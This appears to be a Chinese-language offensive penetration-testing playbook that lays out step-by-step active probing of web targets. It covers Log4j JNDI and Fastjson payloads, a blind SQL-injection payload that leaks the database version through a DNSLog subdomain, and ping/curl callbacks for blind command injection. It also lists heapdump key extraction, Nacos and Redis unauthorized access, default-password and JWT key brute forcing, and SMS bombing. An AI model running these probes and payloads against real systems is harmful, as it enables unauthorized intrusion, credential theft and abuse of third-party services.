# 主动探测总纲 — 凡是"不发包就看不见"的攻击面一律主动发包

**原则**: 被动浏览只能看见页面 → 组件/管理端点/敏感路径/OOB/认证面全靠主动发包才暴露。
**执行**: S1 按 A→E 低成本扫（每项一击，命中→记录信号），S2 对命中项深度验证。每项结果写入技术栈清单，不许留"未测"。

## A. Java 组件（Java 味站必跑）→ `java-trio-active-probe.md`
- **Shiro**: Cookie `rememberMe=test` → 响应头 `deleteMe` = 命中 → `shiro-rememberme-fast.md` 爆破
- **Log4j**: `python dnslog.py fire --type log4j --target <url>`（Header 带 `${jndi:ldap://<域>}`）
- **Fastjson**: JSON 接口 `python dnslog.py fire --type fastjson --target <url> --data '{"k":"{D}"}'`
- **Jackson/XStream/SnakeYAML**: Java 味+对应接口，`@type` 报错即信号 → `kb_fastjson_shiro_log4j_master_2026.md`

## B. 管理端点/未授权（框架识别后直打）→ `midware-rce.md` + springboot_vulns
- **Spring Boot**: /actuator /env /heapdump /mappings（heapdump→拖密钥）
- **Druid**: /druid/index.html（SQL 监控+session 泄露）
- **Swagger**: /swagger-ui.html /v2/api-docs /v3/api-docs（导 API 清单）
- **App 服务器**: Tomcat /manager / WebLogic /console / JBoss /invoker
- **Nacos** (8848): 未授权读用户→默认口令→CVE-2021-29441 UA绕过→配置中心凭据 → `midware-nacos.md`

**单 IP 多服务穷尽（强制）**: 一个 IP 命中主组件后，必须 httpx 扫常见端口(80/443/8080/8081/8848/8888/9000/9361/6379) 穷尽同机其他服务。
- 每端口独立跑默认口令+未授权（实战: 1 IP = Nacos+Redis+ThingsBoard 三组件）
- Redis 6379 必测: 配置泄露密码→AUTH直连；`PING` 返回 `+PONG`=未授权可写shell面
- Nginx 反代 403 → Host 头换域名试 / 路径穿透 `midware-rce.md`

## C. 敏感路径/备份源码（dirsearch 批量）→ `kb_path_discovery_methodology.md`
- 备份(.bak/.sql/.zip) / .git/.svn / WEB-INF/web.xml / upload / 源码泄露
- 命中优先: 源码→审密钥/接口; 备份→脱库/配置凭据

## D. OOB 无回显确认（一律 DNSLog 子域）→ `sqli.md` / `ssrf.md` + DNSLog 规则
- **SQLi 盲注**: `load_file(concat('\\\\',(select version()),'.<子域>\\x'))` → `dnslog.py watch`
- **SSRF**: url/api 参数 → `http://<子域>`
- **命令注入/RCE 无回显**: `ping <子域>` / curl → `dnslog.py watch`
- 工具: `dnslog.py probe --type <sqli|ssrf|xss>` 一条命令闭环；0 回连→换 HTTP receiver 8811

## E. 认证侧主动（登录功能必测）→ `auth.md`
- **短信轰炸**: generateCode 限速（SMSe）
- **弱口令/初始密码**: 默认账号体系
- **JWT/Token**: 弱密钥爆破 / 构造重放 / RSA 公钥复用
- **验证码**: 可预测/复用/返回包泄露

## 记录与止损
- 每项写技术栈清单: 命中X / 未发现Y，第⑦层组件不许"未测"
- 成本: A<B<C<D<E；0 信号 5min 后盲打模式
- 止损: 单项无果立即切下一类，不纠缠
